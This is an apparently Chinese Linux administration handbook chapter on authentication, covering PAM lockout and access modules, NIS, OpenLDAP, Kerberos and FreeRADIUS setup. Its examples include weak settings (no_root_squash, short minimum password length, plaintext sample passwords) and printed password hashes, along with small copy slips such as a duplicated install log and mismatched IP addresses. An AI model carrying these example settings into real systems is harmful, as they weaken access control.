# 部分 X. Security

## 第 141 章 Authentication

## 1. /etc/login.defs

登陆参数设定配置文件

```
# cat /etc/login.defs
#
# Please note that the parameters in this configuration file control the
# behavior of the tools from the shadow-utils component. None of these
# tools uses the PAM mechanism, and the utilities that use PAM (such as the
# passwd command) should therefore be configured elsewhere. Refer to
# /etc/pam.d/system-auth for more information.
#

# *REQUIRED*
#   Directory where mailboxes reside, _or_ name of file, relative to the
#   home directory.  If you _do_ define both, MAIL_DIR takes precedence.
#   QMAIL_DIR is for Qmail
#
#QMAIL_DIR	Maildir
MAIL_DIR	/var/spool/mail
#MAIL_FILE	.mail

# Password aging controls:
#
#	PASS_MAX_DAYS	Maximum number of days a password may be used.
#	PASS_MIN_DAYS	Minimum number of days allowed between password changes.
#	PASS_MIN_LEN	Minimum acceptable password length.
#	PASS_WARN_AGE	Number of days warning given before a password expires.
#
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_MIN_LEN	5
PASS_WARN_AGE	7

#
# Min/max values for automatic uid selection in useradd
#
UID_MIN			  500
UID_MAX			60000

#
# Min/max values for automatic gid selection in groupadd
#
GID_MIN			  500
GID_MAX			60000

#
# If defined, this command is run when removing a user.
# It should remove any at/cron/print jobs etc. owned by
# the user to be removed (passed as the first argument).
#
#USERDEL_CMD	/usr/sbin/userdel_local

#
# If useradd should create home directories for users by default
# On RH systems, we do. This option is overridden with the -m flag on
# useradd command line.
#
CREATE_HOME	yes

# The permission mask is initialized to this value. If not specified,
# the permission mask will be initialized to 022.
UMASK           077

# This enables userdel to remove user groups if no members exist.
#
USERGROUPS_ENAB yes

# Use SHA512 to encrypt password.
ENCRYPT_METHOD SHA512

```

## 2. PAM 插件认证

配置文件

```
ls  /etc/pam.d/
chfn         crond                login    passwd            remote    runuser-l          smtp          ssh-keycat  sudo-i       system-auth-ac
chsh         fingerprint-auth     newrole  password-auth     run_init  smartcard-auth     smtp.postfix  su          su-l
config-util  fingerprint-auth-ac  other    password-auth-ac  runuser   smartcard-auth-ac  sshd          sudo        system-auth

```

认证插件

```
ls /lib64/security/

```

### 2.1. pam_tally2.so

此模块的功能是，登陆错误输入密码 3 次，5 分钟后自动解禁，在未解禁期间输入正确密码也无法登陆。

在配置文件 /etc/pam.d/sshd 顶端加入

```
auth required pam_tally2.so deny=3 onerr=fail unlock_time=300

```

查看失败次数

```
# pam_tally2
Login           Failures Latest failure     From
root               14    07/12/13 15:44:37  192.168.6.2
neo                 8    07/12/13 15:45:36  192.168.6.2

```

重置计数器

```
# pam_tally2 -r -u root
Login           Failures Latest failure     From
root               14    07/12/13 15:44:37  192.168.6.2

# pam_tally2 -r -u neo
Login           Failures Latest failure     From
neo                 8    07/12/13 15:45:36  192.168.6.2

```

pam_tally2 计数器日志保存在 /var/log/tallylog 注意，这是二进制格式的文件

例 141.1. /etc/pam.d/sshd - pam_tally2.so

```
# cat  /etc/pam.d/sshd
#%PAM-1.0
auth required pam_tally2.so deny=3 onerr=fail unlock_time=300

auth	   required	pam_sepermit.so
auth       include      password-auth
account    required     pam_nologin.so
account    include      password-auth
password   include      password-auth
# pam_selinux.so close should be the first session rule
session    required     pam_selinux.so close
session    required     pam_loginuid.so
# pam_selinux.so open should only be followed by sessions to be executed in the user context
session    required     pam_selinux.so open env_params
session    optional     pam_keyinit.so force revoke
session    include      password-auth

```

以上配置 root 用户不受限制, 如果需要限制 root 用户，参考下面

```
auth required pam_tally2.so deny=3 unlock_time=5 even_deny_root root_unlock_time=1800

```

### 2.2. pam_listfile.so

#### 用户登陆限制

将下面一行添加到 /etc/pam.d/sshd 中，这里采用白名单方式，你也可以采用黑名单方式

```
auth       required     pam_listfile.so item=user sense=allow file=/etc/ssh/whitelist onerr=fail

```

将允许登陆的用户添加到 /etc/ssh/whitelist，除此之外的用户将不能通过 ssh 登陆到你的系统

```
# cat /etc/ssh/whitelist
neo
www

```

例 141.2. /etc/pam.d/sshd - pam_listfile.so

```
# cat /etc/pam.d/sshd
#%PAM-1.0
auth       required     pam_listfile.so item=user sense=allow file=/etc/ssh/whitelist onerr=fail
auth       required     pam_tally2.so deny=3 onerr=fail unlock_time=300

auth	   required	pam_sepermit.so
auth       include      password-auth
account    required     pam_nologin.so
account    include      password-auth
password   include      password-auth
# pam_selinux.so close should be the first session rule
session    required     pam_selinux.so close
session    required     pam_loginuid.so
# pam_selinux.so open should only be followed by sessions to be executed in the user context
session    required     pam_selinux.so open env_params
session    optional     pam_keyinit.so force revoke
session    include      password-auth

```

sense=allow 白名单方式, sense=deny 黑名单方式

```
auth       required     pam_listfile.so item=user sense=deny file=/etc/ssh/blacklist onerr=fail

```

更多细节请查看手册 $ man pam_listfile

### 2.3. pam_access.so

编辑 /etc/pam.d/sshd 文件，加入下面一行

```
account required pam_access.so

```

保存后重启 sshd 进程

编辑 /etc/security/access.conf 文件

```

cat >>  /etc/security/access.conf << EOF

- : root : ALL EXCEPT 192.168.6.1
EOF

```

只能通过 192.168.6.1 登陆, 添加多个 IP 地址

```
- : root : ALL EXCEPT 192.168.6.1 192.168.6.2

```

测试是否生效

### 2.4. pam_wheel.so

限制普通用户通过 su 命令提升权限至 root. 只有属于 wheel 组的用户允许通过 su 切换到 root 用户

编辑 /etc/pam.d/su 文件，去掉下面的注释

```
auth		required	pam_wheel.so use_uid

```

修改用户组别，添加到 wheel 组

```
# usermod -G wheel www

# id www
uid=501(www) gid=501(www) groups=501(www),10(wheel)

```

没有加入到 wheel 组的用户使用 su 时会提示密码不正确。

```
$ su - root
Password:
su: incorrect password

```

## 3. Network Authentication

### 3.1. Network Information Service (NIS)

#### 3.1.1. 安装 NIS 服务器

过程 141.1. 安装 NIS 服务器

1.  ypserv

    ```

    # yum install ypserv -y

    ```

2.  /etc/hosts

    ```

    [root@nis ~]# hostname nis.example.com				
    [root@nis ~]# echo "192.168.3.5 nis.example.com" >> /etc/hosts
    [root@nis ~]# cat /etc/hosts
    # Do not remove the following line, or various programs
    # that require network functionality will fail.
    127.0.0.1 datacenter.example.com datacenter localhost.localdomain localhost
    ::1 localhost6.localdomain6 localhost6
    127.0.0.1 kerberos.example.com
    192.168.3.5 nis.example.com

    ```

3.  设置 NIS 域名

    ```

    # nisdomainname example.com
    # nisdomainname
    example.com

    ```

    加入 /etc/rc.local 开机脚本

    ```

    # echo '/bin/nisdomainname example.com' >> /etc/rc.local
    # echo 'NISDOMAIN=example.com' >> /etc/sysconfig/network

    ```

4.  设置/etc/ypserv.conf 主配置文件

    ```

    # vim /etc/ypserv.conf

    127.0.0.0/255.255.255.0 : * : * : none
    192.168.3.0/255.255.255.0 : * : * : none
    * : * : * : deny

    ```

5.  创建 /var/yp/securenets 文件

    securenets 安全配置文件

    ```

    # vim /var/yp/securenets
    host 127.0.0.1
    255.255.255.0 192.168.3.0

    ```

6.  启动 NIS 服务器

    NIS 服务器需要 portmap 服务的支持，并且需要启动 ypserv 和 yppasswdd 两个服务

    ```

    [root@nis ~]# service portmap status
    portmap (pid 2336)
    is running...
    [root@nis ~]# service ypserv start
    Starting YP
    server services: [ OK ]
    [root@nis ~]# service yppasswdd start
    Starting YP passwd service: [ OK ]

    ```

7.  构建 NIS 数据库

    32bit: /usr/lib/yp/ypinit -m

    64bit: /usr/lib64/yp/ypinit -m

    ```

    [root@nis ~]# /usr/lib64/yp/ypinit -m

    At this point, we have to construct a list of the hosts which will run NIS
    servers.  nis.example.com is in the list of NIS server hosts.  Please continue to add
    the names for the other hosts, one per line.  When you are done with the
    list, type a <control D>.
            next host to add:  nis.example.com
            next host to add:
            next host to add:
    The current list of NIS servers looks like this:

    nis.example.com

    Is this correct?  [y/n: y]
    We need a few minutes to build the databases...
    Building /var/yp/example.com/ypservers...
    Running /var/yp/Makefile...
    gmake[1]: Entering directory `/var/yp/example.com'
    Updating passwd.byname...
    Updating passwd.byuid...
    Updating group.byname...
    Updating group.bygid...
    Updating hosts.byname...
    Updating hosts.byaddr...
    Updating rpc.byname...
    Updating rpc.bynumber...
    Updating services.byname...
    Updating services.byservicename...
    Updating netid.byname...
    Updating protocols.bynumber...
    Updating protocols.byname...
    Updating mail.aliases...
    gmake[1]: Leaving directory `/var/yp/example.com'

    nis.example.com has been set up as a NIS master server.

    Now you can run ypinit -s nis.example.com on all slave server.

    ```

    检查

    ```

    # ls /var/yp/
    binding example.com Makefile nicknames securenets ypservers				

    ```

8.  Service

    ```

    [root@datacenter ~]# chkconfig --list | grep yp
    ypbind          0:off   1:off   2:off   3:off   4:off   5:off   6:off
    yppasswdd       0:off   1:off   2:off   3:off   4:off   5:off   6:off
    ypserv          0:off   1:off   2:off   3:off   4:off   5:off   6:off
    ypxfrd          0:off   1:off   2:off   3:off   4:off   5:off   6:off

    [root@nis ~]# chkconfig ypserv on
    [root@nis ~]# chkconfig yppasswdd on

    ```

#### 3.1.2. Slave NIS Server

Now you can run ypinit -s nis.example.com on all slave server.

```

# ypinit -s nis.example.com		

```

#### 3.1.3. 客户机软件安装

过程 141.2. 安装 NIS 客户端软件

1.  NIS 客户机需要安装 ypbind 和 yp-tools 两个软件包

    ```

    # yum install ypbind yp-tools -y

    ```

2.  NIS 域名

    ```

    # nisdomainname example.com

    ```

3.  /etc/hosts

    ```

    192.168.3.5 nis.example.com

    ```

4.  /etc/yp.conf

    ```

    # vim /etc/yp.conf
    domain example.com server nis.example.com

    ```

5.  /etc/nsswitch.conf

    ```

    # vim /etc/nsswitch.conf
    passwd: files nis
    shadow: files nis
    group: files nis
    hosts: files nis dns

    ```

6.  启动 ypbind 服务程序

    ```

    [root@test ~]# service portmap status
    portmap is stopped
    [root@test ~]# service portmap start
    Starting portmap: [ OK ]
    [root@test ~]# service ypbind start
    Turning on allow_ypbind SELinux boolean
    Binding to the NIS domain: [ OK ]
    Listening for an NIS domain server..

    ```

7.  yp-tools 测试工具

    yptest 命令可对 NIS 服务器进行自动测试

    ```

    # yptest	

    ```

    ypwhich 命令可显示 NIS 客户机所使用的 NIS 服务器的主机名称和数据库文件列表

    ```

    # ypwhich
    # ypwhich -x			

    ```

    ypcat 命令显示数据库文件列表和指定数据库的内容

    ```

    # ypcat -x
    # ypcat passwd				

    ```

8.  NIS Client Service

    ```

    # chkconfig ypbind on				

    ```

#### 3.1.4. Authentication Configuration

```

# authconfig-tui		

```

Use NIS

```

                ┌────────────────┤ Authentication Configuration ├─────────────────┐
                │                                                                 │
                │  User Information        Authentication                         │
                │  [ ] Cache Information   [*] Use MD5 Passwords                  │
                │  [ ] Use Hesiod          [*] Use Shadow Passwords               │
                │  [ ] Use LDAP            [ ] Use LDAP Authentication            │
                │  [*] Use NIS             [ ] Use Kerberos                       │
                │  [ ] Use Winbind         [ ] Use SMB Authentication             │
                │                          [ ] Use Winbind Authentication         │
                │                          [ ] Local authorization is sufficient  │
                │                                                                 │
                │            ┌────────┐                      ┌──────┐             │
                │            │ Cancel │                      │ Next │             │
                │            └────────┘                      └──────┘             │
                │                                                                 │
                │                                                                 │
                └─────────────────────────────────────────────────────────────────┘		

```

NIS Settings

```

                        ┌─────────────────┤ NIS Settings ├─────────────────┐
                        │                                                  │
                        │ Domain: example.com_____________________________ │
                        │ Server: nis.example.com_________________________ │
                        │                                                  │
                        │         ┌──────┐                 ┌────┐          │
                        │         │ Back │                 │ Ok │          │
                        │         └──────┘                 └────┘          │
                        │                                                  │
                        │                                                  │
                        └──────────────────────────────────────────────────┘

```

#### 3.1.5. application example

nis server:

在 NIS 服务器上创建一个 test 用户

```

# adduser test
# passwd test
# /usr/lib64/yp/ypinit -m

```

nis client

使用 test 用户登录到客户机

```

ssh test@client.example.com		

```

测试

```

[root@test ~]# yptest
Test 1: domainname
Configured domainname is "example.com"

Test 2: ypbind
Used NIS server:
nis.example.com

Test 3: yp_match
WARNING: No such key in map (Map
passwd.byname, key nobody)

Test 4: yp_first
neo
neo:$1$e1nd3pts$s7NikMnKwpL4vUp2LM/N9.:500:500::/home/neo:/bin/bash

Test 5: yp_next
test
test:$1$g4.VCB7i$I/N5W/imakprFdtP02i8/.:502:502::/home/test:/bin/bash
svnroot svnroot:!!:501:501::/home/svnroot:/bin/bash

Test 6: yp_master
nis.example.com

Test 7: yp_order
1271936660

Test 8: yp_maplist
rpc.byname
protocols.bynumber
ypservers
passwd.byname
hosts.byname
rpc.bynumber
group.bygid
services.byservicename
mail.aliases
passwd.byuid
services.byname
netid.byname
protocols.byname
group.byname
hosts.byaddr

Test 9: yp_all
neo
neo:$1$e1nd3pts$s7NikMnKwpL4vUp2LM/N9.:500:500::/home/neo:/bin/bash
test
test:$1$g4.VCB7i$I/N5W/imakprFdtP02i8/.:502:502::/home/test:/bin/bash
svnroot svnroot:!!:501:501::/home/svnroot:/bin/bash
1 tests failed		

```

更改密码

```

$ yppasswd
Changing NIS account information for test on nis.example.com.
Please enter old password:
Changing NIS password for test on
nis.example.com.
Please enter new password:
Please retype new password:

The NIS password has been changed on nis.example.com.		

```

```

-bash-3.2$ ypcat hosts 
127.0.0.1 localhost.localdomain localhost 
127.0.0.1 kerberos.example.com
192.168.3.5 nis.example.com

-bash-3.2$ ypcat passwd
neo:$1$e1nd3pts$s7NikMnKwpL4vUp2LM/N9.:500:500::/home/neo:/bin/bash
test:$1$g4.VCB7i$I/N5W/imakprFdtP02i8/.:502:502::/home/test:/bin/bash
svnroot:!!:501:501::/home/svnroot:/bin/bash

```

```

-bash-3.2$
ypwhich
nis.example.com

ypwhich -x
Use "ethers" for map "ethers.byname"
Use "aliases" for map "mail.aliases"
Use "services" for map "services.byname"
Use "protocols" for map "protocols.bynumber"
Use "hosts" for map "hosts.byname"
Use "networks" for map "networks.byaddr"
Use "group" for map "group.byname"
Use "passwd" for map "passwd.byname"

```

#### 3.1.6. Mount /home volume from NFS

在 NIS 服务器中将“/home”输出为 NFS 共享目录

```

# vi /etc/exports
/home 192.168.3.0/24(sync,rw,no_root_squash)		

```

重启 NFS 服务

```

# service nfs restart

```

在 NIS 客户端中挂载“/home”目录

```

		# vi /etc/fstab
192.168.1.10:/home/ /home nfs 	defaults 0 0		

```

mount home volume

```

# mount /home

```

### 3.2. OpenLDAP

#### 3.2.1. Server

1.  First, install the OpenLDAP server daemon slapd and ldap-utils, a package containing LDAP management utilities:

    ```
    sudo apt-get install slapd ldap-utils				

    ```

    By default the directory suffix will match the domain name of the server. For example, if the machine's Fully Qualified Domain Name (FQDN) is ldap.example.com, the default suffix will be dc=example,dc=com. If you require a different suffix, the directory can be reconfigured using dpkg-reconfigure. Enter the following in a terminal prompt:

    ```
    sudo dpkg-reconfigure slapd				

    ```

2.  example.com.ldif

    ```
    dn: ou=people,dc=example,dc=com
    objectClass: organizationalUnit
    ou: people

    dn: ou=groups,dc=example,dc=com
    objectClass: organizationalUnit
    ou: groups

    dn: uid=john,ou=people,dc=example,dc=com
    objectClass: inetOrgPerson
    objectClass: posixAccount
    objectClass: shadowAccount
    uid: john
    sn: Doe
    givenName: John
    cn: John Doe
    displayName: John Doe
    uidNumber: 1000
    gidNumber: 10000
    userPassword: password
    gecos: John Doe
    loginShell: /bin/bash
    homeDirectory: /home/john
    shadowExpire: -1
    shadowFlag: 0
    shadowWarning: 7
    shadowMin: 8
    shadowMax: 999999
    shadowLastChange: 10877
    mail: john.doe@example.com
    postalCode: 31000
    l: Toulouse
    o: Example
    mobile: +33 (0)6 xx xx xx xx
    homePhone: +33 (0)5 xx xx xx xx
    title: System Administrator
    postalAddress: 
    initials: JD

    dn: cn=example,ou=groups,dc=example,dc=com
    objectClass: posixGroup
    cn: example
    gidNumber: 10000

    ```

3.  To add the entries to the LDAP directory use the ldapadd utility:

    ```
    ldapadd -x -D cn=admin,dc=example,dc=com -W -f example.com.ldif

    ```

    We can check that the content has been correctly added with the tools from the ldap-utils package. In order to execute a search of the LDAP directory:

    ```
    ldapsearch -xLLL -b "dc=example,dc=com" uid=john sn givenName cn

    dn: uid=john,ou=people,dc=example,dc=com
    cn: John Doe
    sn: Doe
    givenName: John				

    ```

Just a quick explanation:

-x: will not use SASL authentication method, which is the default.

-LLL: disable printing LDIF schema information.

#### 3.2.2. Client

1.  libnss-ldap

    ```
    sudo apt-get install libnss-ldap

    ```

2.  reconfigure ldap-auth-config

    ```
    sudo dpkg-reconfigure ldap-auth-config

    ```

3.  auth-client-config

    ```
    sudo auth-client-config -t nss -p lac_ldap				

    ```

4.  pam-auth-update.

    ```
    sudo pam-auth-update

    ```

#### 3.2.3. User and Group Management

```
sudo apt-get install ldapscripts

```

/etc/ldapscripts/ldapscripts.conf

```
SERVER=localhost
BINDDN='cn=admin,dc=example,dc=com'
BINDPWDFILE="/etc/ldapscripts/ldapscripts.passwd"
SUFFIX='dc=example,dc=com'
GSUFFIX='ou=Groups'
USUFFIX='ou=People'
MSUFFIX='ou=Computers'
GIDSTART=10000
UIDSTART=10000
MIDSTART=10000		

```

Now, create the ldapscripts.passwd file to allow authenticated access to the directory:

```
sudo sh -c "echo -n 'secret' > /etc/ldapscripts/ldapscripts.passwd"
sudo chmod 400 /etc/ldapscripts/ldapscripts.passwd		

```

### 3.3. Kerberos

#### （Kerberos: Network Authentication Protocol）

http://web.mit.edu/Kerberos/

kerberos 是由 MIT 开发的提供网络认证服务的系统，很早就听说过它的大名，但一直没有使用过它。 它可用来为网络上的各种 server 提供认证服务,使得口令不再是以明文方式在网络上传输，并且联接之间通讯是加密的； 它和 PKI 认证的原理不一样，PKI 使用公钥体制(不对称密码体制)，kerberos 基于私钥体制(对称密码体制)。

#### 3.3.1. Kerberos 安装

##### 3.3.1.1. CentOS 安装

获得 krb5 的安装包

**yum search krb5**

```
[root@centos ~]# yum search krb5
========================================== Matched: krb5 ===========================================
krb5-auth-dialog.x86_64 : Kerberos 5 authentication dialog
krb5-devel.i386 : Development files needed to compile Kerberos 5 programs.
krb5-devel.x86_64 : Development files needed to compile Kerberos 5 programs.
krb5-libs.i386 : The shared libraries used by Kerberos 5.
krb5-libs.x86_64 : The shared libraries used by Kerberos 5.
krb5-server.x86_64 : The KDC and related programs for Kerberos 5.
krb5-workstation.x86_64 : Kerberos 5 programs for use on workstations.
pam_krb5.i386 : A Pluggable Authentication Module for Kerberos 5.
pam_krb5.x86_64 : A Pluggable Authentication Module for Kerberos 5.

```

安装

**yum install krb5-server.i386**

```
[root@centos ~]# yum install krb5-server
Setting up Install Process
Resolving Dependencies
--> Running transaction check
---> Package krb5-server.x86_64 0:1.6.1-36.el5_4.1 set to be updated
--> Finished Dependency Resolution

Dependencies Resolved

====================================================================================================
 Package                 Arch               Version                       Repository           Size
====================================================================================================
Installing:
 krb5-server             x86_64             1.6.1-36.el5_4.1              updates             914 k

Transaction Summary
====================================================================================================
Install      1 Package(s)
Update       0 Package(s)
Remove       0 Package(s)

Total download size: 914 k
Is this ok [y/N]: y
Downloading Packages:
krb5-server-1.6.1-36.el5_4.1.x86_64.rpm                                      | 914 kB     00:01
Running rpm_check_debug
Running Transaction Test
Finished Transaction Test
Transaction Test Succeeded
Running Transaction
  Installing     : krb5-server                                                                  1/1

Installed:
  krb5-server.x86_64 0:1.6.1-36.el5_4.1

Complete!
[root@datacenter ~]#Setting up Install Process
Resolving Dependencies
--> Running transaction check
---> Package krb5-server.x86_64 0:1.6.1-36.el5_4.1 set to be updated
--> Finished Dependency Resolution

Dependencies Resolved

====================================================================================================
 Package                 Arch               Version                       Repository           Size
====================================================================================================
Installing:
 krb5-server             x86_64             1.6.1-36.el5_4.1              updates             914 k

Transaction Summary
====================================================================================================
Install      1 Package(s)
Update       0 Package(s)
Remove       0 Package(s)

Total download size: 914 k
Is this ok [y/N]: y
Downloading Packages:
krb5-server-1.6.1-36.el5_4.1.x86_64.rpm                                      | 914 kB     00:01
Running rpm_check_debug
Running Transaction Test
Finished Transaction Test
Transaction Test Succeeded
Running Transaction
  Installing     : krb5-server                                                                  1/1

Installed:
  krb5-server.x86_64 0:1.6.1-36.el5_4.1

Complete!

```

**yum install krb5-workstation**

```
[root@centos ~]# yum install krb5-workstation

```

**yum install krb5-libs**

##### 3.3.1.2. Install by apt-get

过程 141.3. installation

1.  ```
    $ sudo apt-get install krb5-admin-server		

    ```

2.  Configuring

    ```

      ┌──────────────────────────────┤ Configuring krb5-admin-server ├───────────────────────────────┐
      │                                                                                              │
      │ Setting up a Kerberos Realm                                                                  │
      │                                                                                              │
      │ This package contains the administrative tools required to run the Kerberos master server.   │
      │                                                                                              │
      │ However, installing this package does not automatically set up a Kerberos realm.  This can   │
      │ be done later by running the "krb5_newrealm" command.                                        │
      │                                                                                              │
      │ Please also read the /usr/share/doc/krb5-kdc/README.KDC file and the administration guide    │
      │ found in the krb5-doc package.                                                               │
      │                                                                                              │
      │                                            <Ok>                                              │
      │                                                                                              │
      └──────────────────────────────────────────────────────────────────────────────────────────────┘

    ```

    OK

    ```

     ┌───────────────────────────────┤ Configuring krb5-admin-server ├───────────────────────────────┐
     │                                                                                               │
     │ Kadmind serves requests to add/modify/remove principals in the Kerberos database.             │
     │                                                                                               │
     │ It is required by the kpasswd program, used to change passwords. With standard setups, this   │
     │ daemon should run on the master KDC.                                                          │
     │                                                                                               │
     │ Run the Kerberos V5 administration daemon (kadmind)?                                          │
     │                                                                                               │
     │                           <Yes>                              <No>                             │
     │                                                                                               │
     └───────────────────────────────────────────────────────────────────────────────────────────────┘				

    ```

    Yes

#### 3.3.2. Kerberos Server

过程 141.4. Kerberos Server 配置步骤

1.  Create the Database

    创建 Kerberos 的本地数据库

    **kdb5_util create -r EXAMPLE.COM -s**

    ```
    [root@datacenter ~]# kdb5_util create -r EXAMPLE.COM -s
    Loading random data
    Initializing database '/var/kerberos/krb5kdc/principal' for realm 'EXAMPLE.COM',
    master key name 'K/M@EXAMPLE.COM'
    You will be prompted for the database Master Password.
    It is important that you NOT FORGET this password.
    Enter KDC database master key:
    Re-enter KDC database master key to verify:		

    ```

2.  /etc/krb5.conf

    ```
    # cp /etc/krb5.conf /etc/krb5.conf.old
    # vim /etc/krb5.conf
    [logging]
     default = FILE:/var/log/krb5libs.log
     kdc = FILE:/var/log/krb5kdc.log
     admin_server = FILE:/var/log/kadmind.log

    [libdefaults]
     default_realm = EXAMPLE.COM
     dns_lookup_realm = false
     dns_lookup_kdc = false
     ticket_lifetime = 24h
     forwardable = yes

    [realms]
     EXAMPLE.COM = {
      kdc = kerberos.example.com:88
      admin_server = kerberos.example.com:749
      default_domain = example.com
     }

    [domain_realm]
     .example.com = EXAMPLE.COM
     example.com = EXAMPLE.COM

    [appdefaults]
     pam = {
       debug = false
       ticket_lifetime = 36000
       renew_lifetime = 36000
       forwardable = true
       krb4_convert = false
     }

    ```

    检查下面配置文件 /var/kerberos/krb5kdc/kadm5.acl

    ```
    [root@datacenter ~]# cat /var/kerberos/krb5kdc/kadm5.acl
    */admin@EXAMPLE.COM     *

    ```

    格式

    ```
    The format of the file is:

         Kerberos_principal      permissions     [target_principal]	[restrictions]

    ```

3.  Add Administrators to the Kerberos Database

    创建账号

    ```
    [root@datacenter ~]# kadmin.local
    Authenticating as principal root/admin@EXAMPLE.COM with password.
    kadmin.local:  addprinc admin/admin@EXAMPLE.COM
    WARNING: no policy specified for admin/admin@EXAMPLE.COM; defaulting to no policy
    Enter password for principal "admin/admin@EXAMPLE.COM":
    Re-enter password for principal "admin/admin@EXAMPLE.COM":
    Principal "admin/admin@EXAMPLE.COM" created.
    kadmin.local:

    ```

    也同样可以使用下面命令

    **kadmin.local -q "addprinc username/admin"**

    ```
    [root@datacenter ~]# kadmin.local -q "addprinc krbuser"
    Authenticating as principal admin/admin@EXAMPLE.COM with password.
    WARNING: no policy specified for krbuser@EXAMPLE.COM; defaulting to no policy
    Enter password for principal "krbuser@EXAMPLE.COM":
    Re-enter password for principal "krbuser@EXAMPLE.COM":
    Principal "krbuser@EXAMPLE.COM" created.

    ```

4.  Create a kadmind Keytab

    ```

    [root@datacenter ~]# kadmin.local -q  "ktadd -k /var/kerberos/krb5kdc/kadm5.keytab => kadmin/admin kadmin/changepw"
    Authenticating as principal admin/admin@EXAMPLE.COM with password.
    kadmin.local: Principal => does not exist.
    Entry for principal kadmin/admin with kvno 3, encryption type Triple DES cbc mode with HMAC/sha1 added to keytab WRFILE:/var/kerberos/krb5kdc/kadm5.keytab.
    Entry for principal kadmin/admin with kvno 3, encryption type DES cbc mode with CRC-32 added to keytab WRFILE:/var/kerberos/krb5kdc/kadm5.keytab.
    Entry for principal kadmin/changepw with kvno 3, encryption type Triple DES cbc mode with HMAC/sha1 added to keytab WRFILE:/var/kerberos/krb5kdc/kadm5.keytab.
    Entry for principal kadmin/changepw with kvno 3, encryption type DES cbc mode with CRC-32 added to keytab WRFILE:/var/kerberos/krb5kdc/kadm5.keytab.				

    ```

5.  Start the Kerberos Daemons on the Master KDC

    启动 Kerberos 进程

    ```
    [root@datacenter ~]# sudo /etc/init.d/krb524 start
    Starting Kerberos 5-to-4 Server:                           [  OK  ]

    [root@datacenter ~]# sudo /etc/init.d/krb5kdc restart
    Stopping Kerberos 5 KDC:                                   [  OK  ]
    Starting Kerberos 5 KDC:                                   [  OK  ]

    [root@datacenter ~]# sudo /etc/init.d/kadmin start
    Starting Kerberos 5 Admin Server:                          [  OK  ]

    ```

6.  Log 文件

    ```
    [root@datacenter ~]# cat /var/log/krb5kdc.log

    [root@datacenter ~]# cat /var/log/krb5libs.log

    [root@datacenter ~]# cat /var/log/kadmind.log

    ```

#### 3.3.3. Kerberos Client

过程 141.5. Kerberos Client 配置步骤

1.  Ticket Management

    1.  Obtaining Tickets with kinit

        ```
        [root@datacenter ~]# kinit admin/admin
        Password for admin/admin@EXAMPLE.COM:				

        ```

    2.  Viewing Your Tickets with klist

        ```
        [root@datacenter ~]# klist
        Ticket cache: FILE:/tmp/krb5cc_0
        Default principal: admin/admin@EXAMPLE.COM

        Valid starting     Expires            Service principal
        03/25/10 16:15:18  03/26/10 16:15:18  krbtgt/EXAMPLE.COM@ZEXAMPLECOM

        Kerberos 4 ticket cache: /tmp/tkt0
        klist: You have no tickets cached

        ```

    3.  Destroying Your Tickets with kdestroy

        ```
        [root@datacenter ~]# kdestroy
        [root@datacenter ~]# klist
        klist: No credentials cache found (ticket cache FILE:/tmp/krb5cc_0)

        Kerberos 4 ticket cache: /tmp/tkt0
        klist: You have no tickets cached

        ```

2.  Password Management

    Changing Your Password

    ```

    [root@datacenter ~]# kpasswd
    Password for admin/admin@EXAMPLE.COM:
    Enter new password:
    Enter it again:
    Password changed.

    ```

#### 3.3.4. Kerberos Management

##### 3.3.4.1. ktutil - Kerberos keytab file maintenance utility

```
[root@datacenter ~]# ktutil
ktutil: rkt /var/kerberos/krb5kdc/kadm5.keytab
ktutil:  l
slot KVNO Principal
---- ---- ---------------------------------------------------------------------
   1    3                  kadmin/admin@EXAMPLE.COM
   2    3                  kadmin/admin@EXAMPLE.COM
   3    3               kadmin/changepw@EXAMPLE.COM
   4    3               kadmin/changepw@EXAMPLE.COM
ktutil: q

```

##### 3.3.4.2. klist - list cached Kerberos tickets

```
[root@datacenter ~]# klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: admin/admin@EXAMPLE.COM

Valid starting     Expires            Service principal
03/25/10 16:53:02  03/26/10 16:53:02  krbtgt/EXAMPLE.COM@EXAMPLE.COM
03/25/10 17:02:10  03/26/10 16:53:02  host/172.16.0.8@

Kerberos 4 ticket cache: /tmp/tkt0
klist: You have no tickets cached

```

#### 3.3.5. OpenSSH Authentications

##### 3.3.5.1. Configuring the Application server system

```
[root@datacenter ~]# kinit   admin/admin
Password for admin/admin@EXAMPLE.COM:

[root@datacenter ~]# kadmin.local -q "addprinc -randkey host/172.16.0.8"
Authenticating as principal admin/admin@EXAMPLE.COM with password.
WARNING: no policy specified for host/172.16.0.8@EXAMPLE.COM; defaulting to no policy
Principal "host/172.16.0.8@EXAMPLE.COM" created.

[root@datacenter ~]# kadmin.local -q " ktadd -k /var/kerberos/krb5kdc/kadm5.keytab host/172.16.0.8"
Authenticating as principal admin/admin@EXAMPLE.COM with password.
Entry for principal host/172.16.0.8 with kvno 3, encryption type Triple DES cbc mode with HMAC/sha1 added to keytab WRFILE:/var/kerberos/krb5kdc/kadm5.keytab.
Entry for principal host/172.16.0.8 with kvno 3, encryption type DES cbc mode with CRC-32 added to keytab WRFILE:/var/kerberos/krb5kdc/kadm5.keytab.
[root@datacenter ~]# ktutil
ktutil:  rkt /var/kerberos/krb5kdc/kadm5.keytab
ktutil:  l
slot KVNO Principal
---- ---- ---------------------------------------------------------------------
   1    3                  kadmin/admin@EXAMPLE.COM
   2    3                  kadmin/admin@EXAMPLE.COM
   3    3               kadmin/changepw@EXAMPLE.COM
   4    3               kadmin/changepw@EXAMPLE.COM
   5    3               host/172.16.0.8@EXAMPLE.COM
   6    3               host/172.16.0.8@EXAMPLE.COM
ktutil:  q
[root@datacenter ~]#

```

##### 3.3.5.2. Configuring the Application client system

/etc/ssh/sshd_config

```
KerberosAuthentication yes

```

### 3.4. FreeRADIUS (Remote Authentication Dial In User Service)

#### radiusd - Authentication, Authorization and Accounting server

I want to authorize Wi-Fi Protected Access with freeradius for Wi-Fi Route.

http://freeradius.org/

*   debian/ubuntu

*   FreeRADIUS

*   D-Link DI-624+A

#### 3.4.1. 安装 FreeRADIUS

##### 3.4.1.1. Ubuntu

some package of freeradius.

```
netkiller@shenzhen:~$ apt-cache search freeradius

freeradius - a high-performance and highly configurable RADIUS server
freeradius-dialupadmin - set of PHP scripts for administering a FreeRADIUS server
freeradius-iodbc - iODBC module for FreeRADIUS server
freeradius-krb5 - kerberos module for FreeRADIUS server
freeradius-ldap - LDAP module for FreeRADIUS server
freeradius-mysql - MySQL module for FreeRADIUS server

```

install

```
netkiller@shenzhen:~$ sudo apt-get install freeradius

```

